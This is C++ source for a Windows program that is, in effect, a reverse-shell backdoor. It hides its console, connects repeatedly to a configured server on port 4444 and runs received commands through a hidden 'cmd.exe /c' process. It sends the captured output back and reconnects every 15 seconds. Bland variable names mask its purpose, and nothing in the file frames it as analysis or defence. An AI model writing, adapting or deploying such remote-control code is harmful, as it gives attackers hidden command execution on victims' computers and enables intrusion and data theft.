#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <winsock2.h>
#include <windows.h>

#include <cstdint>
#include <string>
#include <vector>
#include <iostream>
#include <sstream>
#include <fstream>
#include <algorithm>

#pragma comment(lib, "Ws2_32.lib")

constexpr char    SERVER_HOST[] = "127.0.0.1";
constexpr int     SERVER_PORT = 4444;
constexpr int     SECURITY_TOKEN = 994821;

#pragma pack(push, 1)
struct NetworkPacketHeader { uint32_t id, op, len, chk; };
#pragma pack(pop)

std::string RunNativeProcessPipeline(const std::string& commandLineString) {
    std::string pipelineExecutionBuffer = ""; HANDLE hPipeReadSide, hPipeWriteSide; 
    SECURITY_ATTRIBUTES securityAttributesStructure = {sizeof(securityAttributesStructure), NULL, TRUE};
    if(!CreatePipe(&hPipeReadSide, &hPipeWriteSide, &securityAttributesStructure, 0)) return "[-] Pipe Allocation Fail";
    
    STARTUPINFOA processStartupSettings = {sizeof(processStartupSettings)}; PROCESS_INFORMATION activeProcessIdentityTracking = {0};
    processStartupSettings.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; 
    processStartupSettings.wShowWindow = SW_HIDE; 
    processStartupSettings.hStdOutput = hPipeWriteSide;
    processStartupSettings.hStdError = hPipeWriteSide;
    
    std::string internalShellWrapperString = "cmd.exe /c " + commandLineString; 
    std::vector<char> mutableExecutionPayloadArray(internalShellWrapperString.begin(), internalShellWrapperString.end()); 
    mutableExecutionPayloadArray.push_back('\0');
    
    if(CreateProcessA(NULL, mutableExecutionPayloadArray.data(), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &processStartupSettings, &activeProcessIdentityTracking)) {
        CloseHandle(hPipeWriteSide); char localStreamReadBufferCharacter; DWORD readWindowBytesCounter;
        while(ReadFile(hPipeReadSide, &localStreamReadBufferCharacter, 1, &readWindowBytesCounter, NULL) && readWindowBytesCounter > 0) pipelineExecutionBuffer += localStreamReadBufferCharacter;
        CloseHandle(activeProcessIdentityTracking.hProcess); CloseHandle(activeProcessIdentityTracking.hThread);
    } else { 
        CloseHandle(hPipeWriteSide); 
        pipelineExecutionBuffer = "[-] Core Process Invocation Failure"; 
    }
    CloseHandle(hPipeReadSide); 
    return pipelineExecutionBuffer;
}

int main() {
    FreeConsole(); 
    WSADATA nativeWindowsSocketInitializationStructureData; 
    if(WSAStartup(MAKEWORD(2,2), &nativeWindowsSocketInitializationStructureData) != 0) return 1;
    
    while(true) {
        SOCKET transmissionSocketContext = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        sockaddr_in internetSocketRoutingConfiguration = {0}; 
        internetSocketRoutingConfiguration.sin_family = AF_INET; 
        internetSocketRoutingConfiguration.sin_port = htons(SERVER_PORT); 
        inet_pton(AF_INET, SERVER_HOST, &internetSocketRoutingConfiguration.sin_addr);
        
        if(connect(transmissionSocketContext, (SOCKADDR*)&internetSocketRoutingConfiguration, sizeof(internetSocketRoutingConfiguration)) != SOCKET_ERROR) {
            NetworkPacketHeader initializationHandshakeHeader = {static_cast<uint32_t>(SECURITY_TOKEN), 100, 0, 0};
            send(transmissionSocketContext, (char*)&initializationHandshakeHeader, sizeof(NetworkPacketHeader), 0);
            
            while(true) {
                NetworkPacketHeader incomingJobMetadataHeader = {0}; 
                int networkStreamReadMetrics = recv(transmissionSocketContext, (char*)&incomingJobMetadataHeader, sizeof(NetworkPacketHeader), 0); 
                if(networkStreamReadMetrics <= 0) break;
                
                std::vector<char> inboundParameterStorageBlock(incomingJobMetadataHeader.len + 1, 0); 
                if(incomingJobMetadataHeader.len > 0) recv(transmissionSocketContext, inboundParameterStorageBlock.data(), incomingJobMetadataHeader.len, 0);
                
                std::string validatedArgumentString(inboundParameterStorageBlock.begin(), inboundParameterStorageBlock.begin() + incomingJobMetadataHeader.len);
                std::string transactionProcessingReport = "";
                
                if(incomingJobMetadataHeader.op == 101) {
                    transactionProcessingReport = RunNativeProcessPipeline(validatedArgumentString);
                } else if(incomingJobMetadataHeader.op == 102) {
                    transactionProcessingReport = "Subsystem Connection Verified.";
                }
                
                uint32_t arithmeticChecksumAccumulation = 0; 
                for(char analyticalDataByte : transactionProcessingReport) arithmeticChecksumAccumulation += static_cast<uint8_t>(analyticalDataByte);
                
                NetworkPacketHeader responseHeader = {
                    static_cast<uint32_t>(SECURITY_TOKEN), incomingJobMetadataHeader.op, 
                    static_cast<uint32_t>(transactionProcessingReport.length()), arithmeticChecksumAccumulation & 0xFFFFFFFF
                };
                
                send(transmissionSocketContext, (char*)&responseHeader, sizeof(NetworkPacketHeader), 0); 
                if(!transactionProcessingReport.empty()) send(transmissionSocketContext, transactionProcessingReport.c_str(), transactionProcessingReport.length(), 0);
            }
        }
        closesocket(transmissionSocketContext); 
        Sleep(15000); 
    }
    WSACleanup(); 
    return 0;
}
